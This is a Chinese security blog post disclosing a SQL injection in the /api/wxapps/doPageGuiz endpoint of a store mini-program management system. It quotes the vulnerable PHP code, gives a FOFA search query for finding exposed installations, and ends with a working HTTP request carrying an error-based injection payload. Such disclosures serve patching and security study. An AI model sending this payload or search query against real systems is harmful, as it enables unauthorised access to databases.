---
title: "万能门店小程序管理系统 /api/wxapps/doPageGuiz SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-doPageGuiz-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopageguiz-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/doPageGuiz SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/13 18:13
* 734浏览
* [0评论](#comment)
* 49分钟阅读

深入探索

SQL

计算机安全

安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/doPageGuiz 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

音频与视频聊天

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

application/api/controller/Wxapps.php

```
public function doPageGuiz()
    {
        $uniacid = input("uniacid");
        $suid = input('suid');
        $guize['list'] = Db::name('wd_xcx_recharge')->where("uniacid", $uniacid)->order("money asc")->select();
        foreach ($guize['list'] as $k => &$v) {
            $v['allmoney'] = round($v['money'] + $v['getmoney'], 2);
            $v['coupon_num'] = 0;
            if ($v['coupon_con']) {
                $coupon_con = unserialize($v['coupon_con']);
                foreach ($coupon_con as $key => &$value) {
                    $v['coupon_num'] += $value['coupon_num'];
                }
            }
        }
        $conf = Db::name('wd_xcx_rechargeconf')->where("uniacid", $uniacid)->find();
        if (!$conf) {
            $conf = [
                'score_shoppay' => 0
            ];
        }
        $guize['conf'] = $conf;
        if ($suid) {
            $guize['user'] = Db::name('wd_xcx_superuser')->where("uniacid", $uniacid)->where("id", $suid)->field('money,score,uniacid,id')->find();
        } else {
            $guize['user'] = [
                'money' => 0,
                'score' => 0
            ];
        }

        if ($suid) {
            $tiaojian = " and flag <> 2 and flag = 0";
            $prefix = config('database.prefix');
            $yhqsold = Db::query("select * from {$prefix}wd_xcx_coupon_user where uniacid = " . $uniacid . " and suid = " . $suid . $tiaojian . " ORDER BY id desc");
            $time = time();
            // $aa = [];
            foreach ($yhqsold as $key => &$resi) {
                // $arrs = Db::name('wd_xcx_coupon')->where("uniacid", $uniacid)->where("id", $resi['cid'])->find();
                // if ($arrs['btime'] != 0) {
                //     $arrs['btime'] = date("Y-m-d", $arrs['btime']);
                // }
                // if ($arrs['etime'] != 0) {
                //     if ($time > $arrs['etime'] && $resi['flag'] == 0) {
                //         $kdata = array(
                //             "flag" => 2
                //         );
                //         Db::name('wd_xcx_coupon_user')->where("id", $resi['id'])->update($kdata);
                //     }
                //     $arrs['etime'] = date("Y-m-d", $arrs['etime']);
                // }
                if ($resi['etime'] != 0) {
                    if ($time > $resi['etime'] && $resi['flag'] == 0) {
                        $kdata = array(
                            "flag" => 2
                        );
                        Db::name('wd_xcx_coupon_user')->where("id", $resi['id'])->update($kdata);
                    }
                }
            }
        }

        $guize['coupon'] = Db::name('wd_xcx_superuser')->alias("a")->join("wd_xcx_coupon_user b", "a.id = b.suid")->where("a.uniacid", $uniacid)->where("a.id", $suid)->where("b.flag", 0)->field('b.*')->select();
        foreach ($guize['coupon'] as $ksi => $vsi) {
            if ($vsi['use_type'] == 1) {
                if (strstr($vsi['use_class'], 'gpay') === false) {//不存在
                    unset($guize['coupon'][$ksi]);
                }
            }
        }
        $adata['data'] = $guize;
        return json_encode($adata);
    }
```

代码中使用了 input("uniacid") 和 input("suid") 来接收请求参数。这两个变量的值均来自用户输入

编程

* 在代码中，大部分数据库操作都是通过 ThinkPHP 的链式查询完成的，比如：
  + `Db::name('wd_xcx_recharge')->where("uniacid", $uniacid)->order("money asc")->select();`
  + `Db::name('wd_xcx_rechargeconf')->where("uniacid", $uniacid)->find();`
  + `Db::name('wd_xcx_superuser')->where("uniacid", $uniacid)->where("id", $suid)->field('money,score,uniacid,id')->find();`
  + 以及最后的联表查询
* 这些方法默认会对传入的数据进行参数绑定和预处理，从而较为安全，不容易受到 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)攻击。

存在漏洞的部分在于下面这段代码：

```
if ($suid) {
    $tiaojian = " and flag <> 2 and flag = 0";
    $prefix = config('database.prefix');
    $yhqsold = Db::query("select * from {$prefix}wd_xcx_coupon_user where uniacid = " . $uniacid . " and suid = " . $suid . $tiaojian . " ORDER BY id desc");
    // ...后续处理
}
```

* 关键问题在于：
  + 将变量 `$uniacid` 和 `$suid`（直接来自用户输入）通过字符串拼接的方式嵌入到了 SQL 语句中。
  + SQL 语句的构造过程没有任何额外的过滤、转义或参数绑定，完全依赖用户输入的值组成 SQL 命令。

这就造成最终的SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /api/wxapps/doPageGuiz HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

uniacid=1&suid=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)%23
```

[![万能门店小程序管理系统 /api/wxapps/doPageGuiz SQL 注入漏洞](images/img-001-c7cf64f30a24.webp)](https://image.mrxn.net/9fe6f911f2a64245861a5f693c9b50fe.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万能门店小程序管理系统 /api/wxapps/doPageGuiz SQL 注入漏洞](https://mrxn.net/jswz/api-wxapps-doPageGuiz-sqli.html)  
文章链接：<https://mrxn.net/jswz/api-wxapps-doPageGuiz-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

SQL注入防护

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-doPageGuiz-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

代码安全审计

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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